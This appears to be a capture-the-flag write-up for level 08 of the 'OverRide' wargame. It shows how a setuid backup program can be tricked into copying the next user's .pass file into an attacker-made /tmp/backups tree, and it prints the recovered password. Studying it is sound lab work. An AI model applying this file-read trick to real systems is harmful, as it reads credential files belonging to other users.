# Level 08

This one was quite straightforward...

If you look closely it opens argv[1] twice... kinda...

Once it is the actual file you would like to "backup", and the second one is the path int the backups file. We can manipulate that it backsup the .pass of level09into the directory.

```
level08@OverRide:/tmp$ mkdir -p ./backups//home/users/level09/
level08@OverRide:/tmp$ ls -lR
.:
total 0
drwxrwxr-x 3 level08 level08 60 Apr 14 16:15 backups

./backups:
total 0
drwxrwxr-x 3 level08 level08 60 Apr 14 16:15 home

./backups/home:
total 0
drwxrwxr-x 3 level08 level08 60 Apr 14 16:15 users

./backups/home/users:
total 0
drwxrwxr-x 2 level08 level08 40 Apr 14 16:15 level09

./backups/home/users/level09:
total 0

level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
